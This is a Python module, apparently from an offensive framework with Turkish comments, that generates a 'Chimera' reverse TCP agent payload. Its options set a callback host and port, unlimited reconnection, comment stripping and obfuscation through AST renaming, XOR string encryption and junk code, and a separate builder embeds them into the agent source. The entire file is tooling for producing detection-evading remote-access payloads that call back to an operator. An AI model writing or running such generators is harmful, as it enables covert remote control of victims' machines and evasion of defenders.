from core.module import BaseModule
from core.option import Option
from typing import Dict, Any
import os
import sys

# Builder çekirdek kütüphanesini içe aktarmaya çalış
# (Builder kendi içinde obfuscator'ı da yönetir)
try:
    from build.chimera_builder import build_payload, print_build_report
    _BUILDER_AVAILABLE = True
except ImportError:
    proot = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))
    if proot not in sys.path:
        sys.path.insert(0, proot)
    try:
        from build.chimera_builder import build_payload, print_build_report
        _BUILDER_AVAILABLE = True
    except ImportError:
        _BUILDER_AVAILABLE = False

# Obfuscation raporu için (sadece raporlama amaçlı)
try:
    from build.chimera_obfuscator import print_obfuscation_report
    _OBFUSCATOR_AVAILABLE = True
except ImportError:
    _OBFUSCATOR_AVAILABLE = False


class Payload(BaseModule):
    """
    Chimera Core Agent - Reverse TCP Payload Generator.
    Gelişmiş Chimera ajanını üretir. Sadece Python 3 standart kütüphaneleri kullanır.
    Builder + Obfuscation pipeline'ı chimera_builder üzerinden yönetilir.
    """
    Name = "Chimera Core Agent"
    Description = "Chimera reverse TCP ajanı. Builder + Obfuscation altyapısını destekler."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST":           Option("LHOST",           "127.0.0.1", True,  "Bağlanılacak IP (Handler)."),
            "LPORT":           Option("LPORT",           4444,        True,  "Bağlanılacak Port."),
            "OUTPUT":          Option("OUTPUT",          "",          False, "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).", completion_dir="."),
            "RECONNECT_DELAY": Option("RECONNECT_DELAY", 5,           False, "Yeniden bağlanma bekleme süresi (sn)."),
            "MAX_RECONNECT":   Option("MAX_RECONNECT",   -1,          False, "Maksimum bağlanma denemesi (-1 = sınırsız)."),
            "STRIP_COMMENTS":  Option("STRIP_COMMENTS",  False,       False, "Yorum satırlarını temizle.", choices=[True, False]),
            "OBFUSCATE":       Option("OBFUSCATE",       False,       False, "AST rename + XOR string şifreleme + junk code uygula.", choices=[True, False]),
        }

    def _to_bool(self, val) -> bool:
        """Option değerini bool'a çevirir."""
        if isinstance(val, bool):
            return val
        return str(val).lower() in ("true", "1", "yes", "evet")

    def generate(self, quiet: bool = True) -> dict:
        """
        Chimera agent kodunu okur, konfigürasyonları gömer ve
        opsiyonel olarak obfuscation uygular.

        Tüm pipeline (build + obfuscate + dosyaya yaz) chimera_builder
        üzerinden tek seferde yönetilir.

        Returns:
            dict: {success, code, output_path, error, stats, obfuscation_stats}
        """
        lhost           = self.Options["LHOST"].value
        lport           = self.Options["LPORT"].value
        output          = self.Options["OUTPUT"].value
        reconnect_delay = int(self.Options["RECONNECT_DELAY"].value or 5)
        max_reconnect   = int(self.Options["MAX_RECONNECT"].value or -1)
        strip_comments  = self._to_bool(self.Options["STRIP_COMMENTS"].value)
        obfuscate       = self._to_bool(self.Options["OBFUSCATE"].value)

        agent_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "agent.py"
        )

        if not _BUILDER_AVAILABLE:
            return {
                "success": False,
                "error": "[!] build.chimera_builder yüklenemedi!",
                "code": "", "output_path": None, "stats": {}, "obfuscation_stats": {}
            }

        result = build_payload(
            lhost=lhost,
            lport=int(lport),
            reconnect_delay=reconnect_delay,
            max_reconnect=max_reconnect,
            output_path=output if output else None,
            agent_source_path=agent_path,
            strip_comments=strip_comments,
            obfuscate=obfuscate,
            quiet=quiet,
        )

        return result

    def run(self, options: Dict[str, Any]):
        """Payload oluştur, opsiyonel olarak obfuscate et, raporla."""
        if not _BUILDER_AVAILABLE:
            print("[!] HATA: build/chimera_builder.py bulunamadı.")
            return None

        result = self.generate(quiet=False)

        if result["success"]:
            # Build raporu
            print_build_report(result)

            # Obfuscation raporu (varsa)
            if result.get("obfuscation_stats") and _OBFUSCATOR_AVAILABLE:
                print_obfuscation_report({
                    "success": True,
                    "stats": result["obfuscation_stats"]
                })

            if result.get("output_path"):
                print(f"[+] Payload kaydedildi: {result['output_path']}")
                return result["output_path"]

            return result["code"]
        else:
            print(result["error"])
            return result["error"]
